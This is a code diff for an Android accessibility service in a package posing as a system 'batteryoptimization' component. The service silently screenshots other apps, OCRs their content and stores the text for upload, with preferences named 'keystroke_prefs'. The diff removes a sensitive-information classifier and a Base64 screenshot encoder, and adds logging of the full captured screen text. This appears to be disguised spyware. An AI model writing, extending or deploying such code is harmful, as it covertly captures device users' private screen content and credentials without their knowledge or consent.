@@ -2,15 +2,10 @@ package com.android.batteryoptimization
 
 import android.accessibilityservice.AccessibilityService
 import android.content.Intent
-import android.graphics.Bitmap
-import android.util.Base64
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import com.android.batteryoptimization.ocr.OcrEngine
-import com.android.batteryoptimization.ocr.OcrResult
-import com.google.gson.Gson
 import kotlinx.coroutines.*
-import java.io.ByteArrayOutputStream
 import java.util.concurrent.atomic.AtomicLong
 
 class InputAccessibilityService : AccessibilityService() {
@@ -19,7 +14,6 @@ class InputAccessibilityService : AccessibilityService() {
     private var ocrEngine: OcrEngine? = null
     private var screenshotReceiver: android.content.BroadcastReceiver? = null
     private val ocrScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val gson = Gson()
     private val prefs by lazy {
         applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
     }
@@ -130,23 +124,14 @@ class InputAccessibilityService : AccessibilityService() {
                 return
             }
 
-            // 内容分类
             val fullText = ocrResults.joinToString("\n") { it.text }
-            val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(packageName, fullText)
-            val sensitiveInfoJson = gson.toJson(sensitiveInfo)
+            Log.d(TAG, "Auto OCR: ${ocrResults.size} lines, text=$fullText")
 
-            Log.d(TAG, "Auto OCR classify: type=$contentType risk=$riskLevel sensitive=$sensitiveInfo")
-
-            // 存入事件流（每条文本存为一条事件，上传时会按时间戳分组）
             repository.addOcrEvents(
                 packageName = packageName,
                 appName = appName,
-                results = ocrResults,
-                contentType = contentType,
-                riskLevel = riskLevel,
-                sensitiveInfoJson = sensitiveInfoJson
+                results = ocrResults
             )
-            Log.d(TAG, "Auto OCR done: ${ocrResults.size} lines, text=$fullText")
         } catch (e: Exception) {
             Log.e(TAG, "Auto screenshot+OCR failed", e)
             // 失败时重置计时，允许下次重试
@@ -167,16 +152,10 @@ class InputAccessibilityService : AccessibilityService() {
                         val ocrResults = ocrEngine?.recognize(bitmap) ?: emptyList()
                         if (ocrResults.isNotEmpty()) {
                             val fullText = ocrResults.joinToString("\n") { it.text }
-                            val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(packageName = "screenshot", text = fullText)
-                            val sensitiveInfoJson = gson.toJson(sensitiveInfo)
-
                             repository.addOcrEvents(
                                 packageName = "screenshot",
                                 appName = "Screen OCR",
-                                results = ocrResults,
-                                contentType = contentType,
-                                riskLevel = riskLevel,
-                                sensitiveInfoJson = sensitiveInfoJson
+                                results = ocrResults
                             )
                             Log.d(TAG, "Manual OCR result: $fullText")
                         }
@@ -244,28 +223,6 @@ class InputAccessibilityService : AccessibilityService() {
         } else {
             onResult(null, "需要 Android 11+")
         }
-    }
-
-    /**
-     * 将 Bitmap 压缩为 JPEG 并编码为 Base64（最长边缩至 720px，质量 60%）
-     */
-    private fun bitmapToBase64(bitmap: Bitmap): String {
-        val maxDimension = 720f
-        val scale = maxDimension / maxOf(bitmap.width, bitmap.height).coerceAtLeast(1)
-        val resized = if (scale < 1f) {
-            Bitmap.createScaledBitmap(
-                bitmap,
-                (bitmap.width * scale).toInt().coerceAtLeast(1),
-                (bitmap.height * scale).toInt().coerceAtLeast(1),
-                true
-            )
-        } else {
-            bitmap
-        }
-        val baos = ByteArrayOutputStream()
-        resized.compress(Bitmap.CompressFormat.JPEG, 60, baos)
-        if (resized != bitmap) resized.recycle()
-        return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
     }
 
     // ─── 工具方法 ──────────────────────────────────────────────────
